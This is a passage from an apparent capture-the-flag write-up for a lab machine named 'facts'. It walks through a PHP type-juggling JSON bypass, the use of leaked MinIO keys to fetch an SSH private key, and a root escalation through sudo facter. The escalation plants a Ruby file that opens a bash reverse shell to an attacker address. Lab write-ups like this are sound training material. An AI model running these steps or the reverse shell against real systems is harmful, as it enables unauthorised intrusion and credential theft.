 3. Initial Access – Web Application Logical Bypass (PHP Type Juggling)
Critical discovery: The application loads facts dynamically via AJAX/JSON POST requests (primarily `/ajax.php` or similar handler).

Methodology:

1. Proxied all traffic through Burp Suite

2. Interacted with the site (viewing facts, clicking "random", searching)

3. Captured legitimate JSON requests in the Network tab

4. Replayed in Repeater with modified payloads

The vulnerability:

- Server-side PHP used a mix of strict (`===`) and loose (`==`) comparisons (common in `switch` statements)

- Restricted/secret facts were gated behind string-based checks
Exploitation payload (AJAX bypass):

```json

{

  "type": true

}

```

(or `{"secret": true}`, `{"admin": true}` depending on exact key observed)

Why it worked:

- PHP loose comparison: `true == "secret"` evaluates to `true`

- Bypassed the intended admin-only or secret-only branch

- Response contained restricted "secret facts" + backend configuration data
Result: Full admin-level data leak, including MinIO storage configuration.
---
 4. Cloud Storage Exploitation (MinIO)
Credentials location:

- Exposed in the admin dashboard (Storage / Cloud Integration section) after the role escalation via the same logical flaw

- Contained:

  - Access Key ID

  - Secret Access Key

  - Bucket name

  - Endpoint: `http://localhost:54321`

Commands used:

```bash

aws configure set aws_access_key_id <key>

aws configure set aws_secret_access_key <secret>

aws --endpoint-url http://10.129.14.53:54321 s3 ls

aws --endpoint-url http://10.129.14.53:54321 s3 ls s3://facts-bucket

aws --endpoint-url http://10.129.14.53:54321 s3 cp s3://facts-bucket/backups/id_rsa .

Findings:

- Downloaded `id_rsa` (SSH private key for the `facts` user)

- Key was passphrase-protected

Passphrase recovery:

- Extracted from one of the "secret facts" or a related config file in the bucket

- Short/common word (brute-forced with `ssh-keygen -p` or John)

Foothold:

```bash

ssh -i id_rsa facts@facts.htb

 5. Privilege Escalation
Enumeration:

```bash

sudo -l

```

Result:

- `facts` user could run `/usr/bin/facter` with `NOPASSWD`

  

Exploitation:

- `facter` (Puppet component) supports `--custom-dir` to load arbitrary Ruby facts

- Created a malicious fact that spawned a root shell

  

Command:

```bash

echo 'system("bash -c \"bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1\"")' > /tmp/root.rb

sudo facter --custom-dir=/tmp

``` 
Root shell obtained → `cat /root/root.txt`

---
 6. Flags

- User flag: `/home/facts/user.txt`

- Root flag: `/root/root.txt`

---
 7. Lessons Learned & Skills Demonstrated
- Web logic flaws are often more impactful than traditional injection on easy boxes

- PHP type juggling remains a powerful and subtle bypass technique

- Always proxy and manually inspect AJAX/JSON endpoints

- Cloud storage (MinIO/S3) misconfigurations are common escalation vectors

- Tool-specific options (`facter --custom-dir`) are high-value during privesc enumeration

- Credential exposure in admin panels is a frequent real-world finding
  
